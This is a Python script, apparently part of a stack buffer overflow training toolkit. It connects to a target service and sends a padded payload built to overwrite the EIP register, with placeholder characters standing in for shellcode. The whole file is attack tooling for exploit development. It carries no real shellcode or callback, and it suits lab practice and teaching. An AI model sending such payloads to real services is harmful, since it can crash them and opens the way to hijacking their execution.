#!/usr/bin/python3
#_*_ coding: utf8 _*_
#@JoshuaProvoste

import socket,argparse

"""
Project repository: https://github.com/JoshuaProvoste/Stack-Buffer-Overflow-Python-Toolkit 
"""

def hi():
	print("""
 _____             _             _ _           
/  __ \           | |           | | |          
| /  \/ ___  _ __ | |_ _ __ ___ | | | ___ _ __ 
| |    / _ \| '_ \| __| '__/ _ \| | |/ _ \ '__|
| \__/\ (_) | | | | |_| | | (_) | | |  __/ |   
 \____/\___/|_| |_|\__|_|  \___/|_|_|\___|_|                                                                                                              
Controlling overwriting of EIP!                                                                                       
	""")

parser = argparse.ArgumentParser()
parser.add_argument("-ip","--host", type=str, required=True, help="IP host to pwn")
parser.add_argument("-sp","--port", type=int, required=True, help="Port of vulnerable service")
parser.add_argument("-ep","--memory", type=int, required=True, help="Memory address with offset value to control EIP overwriting")
parser.add_argument("-lt","--letter", type=str, required=True, help="Specific letter to overwrite the EIP")
parser.add_argument("-sh","--shellcode", type=int, required=True, help="Characters to overwrite after the EIP to simulate the shellcode")
args = parser.parse_args()

if args.host and args.port and args.memory and args.letter and args.shellcode:
    hi()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((args.host,args.port))
        sock.recv(1024).decode("utf-8")
        characters = "A" * args.memory + args.letter * 4 + "C" * args.shellcode
        payload_encoded = characters.encode("utf-8")
        sock.send(payload_encoded)
        print("Payload sent! Review your debugger tool.")
    except ConnectionRefusedError:
        print("Connection error. Review the IP address or port.")
        exit()
    except socket.timeout:
        sock.close()
        print("\nTimeout error.")
    except socket.error:
        sock.close()
        print("\nSocket error.")
        exit()
    except KeyboardInterrupt:
        sock.close()
        print("\n\nConnection closed. Bye!")
        exit()